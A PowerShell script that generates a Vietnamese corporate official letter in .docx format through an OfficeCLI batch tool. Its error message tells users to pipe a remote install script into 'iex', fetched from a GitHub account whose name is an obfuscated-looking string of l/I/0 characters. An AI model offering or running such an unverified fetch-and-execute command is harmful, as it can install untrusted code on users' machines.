<#
.SYNOPSIS
    Tạo văn bản Công văn (CV) chuẩn thể thức doanh nghiệp Hoàn Cầu theo Quy định 01/2025/QyĐ-PC.

.DESCRIPTION
    Tạo văn bản Công văn tuân thủ Mẫu số 01 (Phụ lục 05 - Trang 25):
    - Tự động chuẩn hóa: chống lặp "V/v:", "Số:", "Kính gửi:", chuẩn hóa ngày tháng.
    - Khổ A4, lề chuẩn (Trên 25mm, Dưới 20mm, Trái 30mm, Phải 15mm).
    - Font Times New Roman 13pt, giãn dòng 1.3x.
    - Trích yếu V/v đặt ngay dưới Số/Ký hiệu (ô số 4 cách ô số 3 đúng 6pt).
    - Header và Chân trang bảng ẩn viền chống vỡ trang.
    - Thực thi siêu tốc qua cơ chế Batch Processing của OfficeCLI.
#>

[CmdletBinding()]
param(
    [string]$OutputPath = "CongVan_HoanCau_Chuan.docx",
    [string]$Title = "Phối hợp triển khai áp dụng quy định thể thức văn bản số 01/2025/QyĐ-PC",
    [string]$Recipient = "CÁC CÔNG TY THÀNH VIÊN VÀ CÁC ĐƠN VỊ TRỰC THUỘC",
    [string]$Organization = "TẬP ĐOÀN HOÀN CẦU",
    [string]$DocNumber = "01/2025/CV-HCGROUP",
    [string]$Location = "Tp. Hồ Chí Minh",
    [object]$Date = $null,
    [string]$SignerPrefix = "", # "TM.", "KT.", "TL.", "TUQ." hoặc rỗng
    [string]$SignerTitle = "TỔNG GIÁM ĐỐC",
    [string]$SignerName = "Nguyễn Thị Thanh Đào",
    [string[]]$Receivers = @("Như kính gửi;", "Ban Tổng Giám đốc;", "Khối Pháp chế & Vận hành;", "Lưu: VT, PC.")
)

$ErrorActionPreference = "Stop"

# --- HÀM CHUẨN HÓA DỮ LIỆU ĐẦU VÀO ---

function Normalize-VnSubject {
    param([string]$Text, [string]$Prefix = "V/v:")
    if ([string]::IsNullOrWhiteSpace($Text)) { return "$Prefix [Trích yếu nội dung công văn]" }
    $clean = $Text.Trim() -replace '^(?i)(v/v|về việc|ve viec|trích yếu)\s*[:：\-.]?\s*', ''
    return "$Prefix $clean"
}

function Normalize-VnDocNumber {
    param([string]$Text, [string]$Default = "01/2025/CV-HCGROUP")
    if ([string]::IsNullOrWhiteSpace($Text)) { return "Số: $Default" }
    $clean = $Text.Trim() -replace '^(?i)Số\s*[:：]?\s*', ''
    return "Số: $clean"
}

function Get-VnCleanRecipient {
    param([string]$Text)
    if ([string]::IsNullOrWhiteSpace($Text)) { return "CÁC CÔNG TY THÀNH VIÊN VÀ ĐƠN VỊ TRỰC THUỘC" }
    return $Text.Trim() -replace '^(?i)Kính gửi\s*[:：]?\s*', ''
}

function Normalize-VnDate {
    param([string]$Loc = "Tp. Hồ Chí Minh", [object]$DInput = $null)
    if ($DInput -is [datetime]) { $d = $DInput }
    elseif ($DInput -is [string] -and $DInput -match '^\d{4}-\d{2}-\d{2}') { $d = [datetime]::Parse($DInput) }
    else { $d = Get-Date }

    $dayStr = if ($d.Day -lt 10) { "0" + $d.Day } else { [string]$d.Day }
    $monthStr = if ($d.Month -lt 10) { "0" + $d.Month } else { [string]$d.Month }
    return "$Loc, ngày $dayStr tháng $monthStr năm $($d.Year)"
}

# --- BƯỚC 1: CHUẨN HÓA DỮ LIỆU ---

$normTitle = Normalize-VnSubject -Text $Title -Prefix "V/v:"
$normDocNumber = Normalize-VnDocNumber -Text $DocNumber
$cleanRecipient = Get-VnCleanRecipient -Text $Recipient
$normDateString = Normalize-VnDate -Loc $Location -DInput $Date

# --- BƯỚC 2: KIỂM TRA ENGINE OFFICECLI ---

$cli = Get-Command officecli -ErrorAction SilentlyContinue
if (-not $cli) {
    $candidates = @("$env:LOCALAPPDATA\agy\bin\officecli.exe", "$env:LOCALAPPDATA\OfficeCLI\officecli.exe")
    $cliPath = $candidates | Where-Object { Test-Path $_ } | Select-Object -First 1
    if (-not $cliPath) {
        throw "OfficeCLI chưa được cài đặt. Vui lòng chạy: irm https://raw.githubusercontent.com/llIIllIID0EIIllIIll/agy-skills/main/install.ps1 | iex"
    }
} else {
    $cliPath = $cli.Source
}

$fullPath = [System.IO.Path]::GetFullPath($OutputPath)
$parentDir = Split-Path -Parent $fullPath
if ($parentDir -and !(Test-Path $parentDir)) {
    New-Item -ItemType Directory -Path $parentDir -Force | Out-Null
}

& $cliPath close $fullPath 2>$null
if (Test-Path $fullPath) { Remove-Item $fullPath -Force }

Write-Host "[*] Khởi tạo tài liệu Công văn: $fullPath" -ForegroundColor Cyan
& $cliPath create $fullPath

# --- BƯỚC 3: DỰNG DANH SÁCH LỆNH BATCH ---

$batchCmds = [System.Collections.Generic.List[object]]::new()

# 1. Page Setup A4 & Lề chuẩn
$batchCmds.Add(@{
    command = "set"; path = "/"
    props = @{
        defaultFont = "Times New Roman"; defaultFontSize = "13pt"
        pageWidth = "11906"; pageHeight = "16838"
        marginTop = "1417"; marginBottom = "1134"
        marginLeft = "1701"; marginRight = "850"
    }
})

# 2. Header Table (2 cột ẩn viền)
$batchCmds.Add(@{
    command = "add"; parent = "/body"; type = "table"
    props = @{ cols = 2; rows = 1; "border.all" = "none"; width = "100%" }
})

# Cột 1 (Trái): Tên Đơn vị, Số CV, Trích yếu V/v (đặt cách số hiệu 6pt)
$batchCmds.Add(@{ command = "add"; parent = "/body/tbl[1]/tr[1]/tc[1]"; type = "p"; props = @{ text = $Organization.ToUpper(); alignment = "center"; bold = "true"; size = "12pt" } })
$batchCmds.Add(@{ command = "add"; parent = "/body/tbl[1]/tr[1]/tc[1]"; type = "p"; props = @{ text = $normDocNumber; alignment = "center"; size = "12pt" } })
$batchCmds.Add(@{ command = "add"; parent = "/body/tbl[1]/tr[1]/tc[1]"; type = "p"; props = @{ text = $normTitle; alignment = "center"; italic = "true"; size = "12pt"; spaceBefore = "6pt" } })

# Cột 2 (Phải): Quốc hiệu, Tiêu ngữ, Ngày tháng
$batchCmds.Add(@{ command = "add"; parent = "/body/tbl[1]/tr[1]/tc[2]"; type = "p"; props = @{ text = "CỘNG HÒA XÃ HỘI CHỦ NGHĨA VIỆT NAM"; alignment = "center"; bold = "true"; size = "12pt" } })
$batchCmds.Add(@{ command = "add"; parent = "/body/tbl[1]/tr[1]/tc[2]"; type = "p"; props = @{ text = "Độc lập - Tự do - Hạnh phúc"; alignment = "center"; bold = "true"; size = "13pt" } })
$batchCmds.Add(@{ command = "add"; parent = "/body/tbl[1]/tr[1]/tc[2]"; type = "p"; props = @{ text = $normDateString; alignment = "center"; italic = "true"; size = "13pt" } })

# 3. Kính gửi (In hoa, Đứng, Đậm)
$batchCmds.Add(@{ command = "add"; parent = "/body"; type = "p"; props = @{ text = "Kính gửi: $($cleanRecipient.ToUpper())"; bold = "true"; size = "13pt"; spaceBefore = "18pt"; spaceAfter = "12pt" } })

# 4. Nội dung công văn
$bodyPProps = @{ alignment = "both"; size = "13pt"; lineSpacing = "1.3x"; firstLineIndent = "709"; spaceBefore = "3pt"; spaceAfter = "6pt" }

$p1 = $bodyPProps.Clone(); $p1["text"] = "- Căn cứ Quy định số 01/2025/QyĐ-PC ngày 01/10/2025 của Tập đoàn Hoàn Cầu về Thể thức và Kỹ thuật trình bày văn bản;"
$batchCmds.Add(@{ command = "add"; parent = "/body"; type = "p"; props = $p1 })

$p2 = $bodyPProps.Clone(); $p2["text"] = "- Nhằm đảm bảo tính thống nhất, nâng cao tính chuyên nghiệp và hiệu quả trong công tác soạn thảo, quản lý văn thư trên toàn hệ thống Tập đoàn và các đơn vị thành viên;"
$batchCmds.Add(@{ command = "add"; parent = "/body"; type = "p"; props = $p2 })

$p3 = $bodyPProps.Clone(); $p3["text"] = "Tổng Giám đốc Tập đoàn Hoàn Cầu đề nghị Thủ trưởng các Đơn vị trực thuộc và Giám đốc các Công ty thành viên tập trung chỉ đạo triển khai thực hiện các nội dung sau:"
$batchCmds.Add(@{ command = "add"; parent = "/body"; type = "p"; props = $p3 })

$p4 = $bodyPProps.Clone(); $p4["text"] = "1. Tổ chức phổ biến, quán triệt toàn diện nội dung Quy định thể thức văn bản số 01/2025/QyĐ-PC đến toàn thể cán bộ, nhân viên trong đơn vị."
$batchCmds.Add(@{ command = "add"; parent = "/body"; type = "p"; props = $p4 })

$p5 = $bodyPProps.Clone(); $p5["text"] = "2. Nghiêm túc áp dụng chuẩn lề A4 (Trên 25mm, Dưới 20mm, Trái 30mm, Phải 15mm), font Times New Roman cỡ 13pt và hệ thống mã viết tắt 33 loại văn bản theo đúng Phụ lục 01."
$batchCmds.Add(@{ command = "add"; parent = "/body"; type = "p"; props = $p5 })

$p6 = $bodyPProps.Clone(); $p6["text"] = "3. Giao Khối Công nghệ & Vận hành phối hợp cùng Ban Pháp chế thường xuyên kiểm tra, rà soát và hỗ trợ kỹ thuật định dạng văn bản tự động cho các phòng ban."
$batchCmds.Add(@{ command = "add"; parent = "/body"; type = "p"; props = $p6 })

$p7 = $bodyPProps.Clone(); $p7["text"] = "Đề nghị các Đơn vị nghiêm túc phối hợp và triển khai thực hiện./."
$p7["spaceAfter"] = "20pt"
$batchCmds.Add(@{ command = "add"; parent = "/body"; type = "p"; props = $p7 })

# 5. Chân trang Bảng 2 cột (Nơi nhận & Chữ ký)
$batchCmds.Add(@{
    command = "add"; parent = "/body"; type = "table"
    props = @{ cols = 2; rows = 1; "border.all" = "none"; width = "100%" }
})

$batchCmds.Add(@{ command = "add"; parent = "/body/tbl[2]/tr[1]/tc[1]"; type = "p"; props = @{ text = "Nơi nhận:"; bold = "true"; italic = "true"; size = "10pt"; spaceAfter = "2pt" } })
foreach ($rcv in $Receivers) {
    $batchCmds.Add(@{ command = "add"; parent = "/body/tbl[2]/tr[1]/tc[1]"; type = "p"; props = @{ text = "- $rcv"; size = "10pt"; lineSpacing = "1.15x"; spaceAfter = "1pt" } })
}

$signerTitleFull = if ($SignerPrefix) { "$SignerPrefix $SignerTitle" } else { $SignerTitle }
$batchCmds.Add(@{ command = "add"; parent = "/body/tbl[2]/tr[1]/tc[2]"; type = "p"; props = @{ text = $signerTitleFull; alignment = "center"; bold = "true"; size = "13pt"; spaceAfter = "45pt" } })
$batchCmds.Add(@{ command = "add"; parent = "/body/tbl[2]/tr[1]/tc[2]"; type = "p"; props = @{ text = $SignerName; alignment = "center"; bold = "true"; size = "13pt" } })

# --- BƯỚC 4: THỰC THI BATCH QUA OFFICECLI ---

Write-Host "[+] Đang thực thi $($batchCmds.Count) thao tác tạo Công văn bằng OfficeCLI Batch..." -ForegroundColor Yellow
$tempBatchFile = [System.IO.Path]::GetTempFileName()
try {
    $batchCmds | ConvertTo-Json -Depth 6 | Set-Content -Path $tempBatchFile -Encoding utf8
    $batchResult = & $cliPath batch $fullPath --input $tempBatchFile 2>&1
    & $cliPath close $fullPath 2>$null
}
finally {
    if (Test-Path $tempBatchFile) { Remove-Item $tempBatchFile -Force -ErrorAction SilentlyContinue }
}

Write-Host "===================================================" -ForegroundColor Cyan
Write-Host "  TẠO THÀNH CÔNG CÔNG VĂN CHUẨN HOÀN CẦU!" -ForegroundColor Green
Write-Host "  Trích yếu : $normTitle" -ForegroundColor White
Write-Host "  Số hiệu   : $normDocNumber" -ForegroundColor White
Write-Host "  File xuất : $fullPath" -ForegroundColor White
Write-Host "===================================================" -ForegroundColor Cyan
